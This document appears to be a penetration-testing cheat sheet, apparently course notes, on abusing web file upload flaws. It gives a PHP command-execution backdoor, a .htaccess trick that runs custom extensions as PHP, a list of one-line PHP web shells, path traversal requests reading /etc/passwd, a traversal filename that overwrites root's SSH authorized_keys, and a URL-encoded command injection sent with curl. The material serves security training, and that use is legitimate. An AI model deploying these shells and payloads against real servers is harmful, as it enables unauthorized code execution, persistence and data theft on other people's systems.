## File upload

```
$ cat .htaccess
AddType application/x-httpd-php .evil

$ cat simple-backdoor.evil
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

http://192.168.204.187/uploads/simple-backdoor.evil?cmd=whoami
```
💡 If we can upload a webshell and access it in /uploads - GG! - Can be used with combo with directory traversal / LFI - abuse the upload path in Burp to put it in /var and then access it like here `http://240.0.0.1:8000/backend/?view=../../../../../../../../etc/passwd`, `http://240.0.0.1:8000/backend/?view=../../../../../../../../var/cmd.php&cmd=whoami`
💡 Non executable - Could try to overwrite ssh keys: In burp: `filename=../../../../../../../root/.ssh/authorized\_keys `
💡 Good place to upload webshells: `C:\\xampp\\htdocs\\html-php-backdoor.php` We can check this path via `phpinfo.php` on DOCUMENT\_ROOT  `curl[http://192.168.120.132:45332/phpinfo.php | grep 'DOCUMENT\_ROOT' | html2text`
💡 If we have something that looks like a direct command on the os - We can try to abuse it with URL encoded ‘`;`’ `/` ‘`&&`’ /‘`&`’. Example from course:
```bash
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
```

## Web Shells
- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) - `/opt/useful/seclists/Web-Shells`
- [phpbash](https://github.com/Arrexel/phpbash)
```
<?php system($_GET['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo system($_REQUEST['shell']): ?>
```

- If web shell just shows source code:
	- The server didn't render the shell at all due to the unknown extension.
	- It can be noticed that the server running on the machine is apache.
	- So we could potentially upload a "`.htaccess`" file to the directory to let the server render my "`.xxx`" extension as PHP script. John Hammond has a [video](https://www.youtube.com/watch?v=xZd1JWmLGLk) to explain it well.
	- We have to make our own `.htaccess` file
```shell
echo "AddType application/x-httpd-php .xxx" > .htaccess
```
- After we upload that file, upload webshell with `.xxx` extension and it will take it